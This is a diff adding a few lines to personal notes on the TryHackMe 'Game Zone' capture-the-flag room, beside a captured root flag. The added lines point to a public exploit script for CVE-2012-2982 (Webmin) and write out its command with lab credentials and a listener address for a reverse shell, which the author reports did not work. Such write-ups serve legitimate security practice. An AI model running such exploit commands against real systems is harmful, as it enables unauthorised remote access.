@@ -221,6 +221,13 @@ root
 cat root.txt
 a4b945830144bdd71908d12d902adeee
 
+Searching w/ google, I came across this script
+https://github.com/OstojaOfficial/CVE-2012-2982
+
+python3 exploit.py <IP> <Username> <Password> <LHOST> <LPORT>
+python3 exploit.py localhost:10000 agent47 videogamer124 10.6.88.227 443
+not success
+hic :<
 
 https://www.pwndefend.com/2020/02/03/try-hack-me-part-5-game-zone/
 https://bryanwendt.wordpress.com/2020/12/01/tryhackme-gamezone-walkthrough/
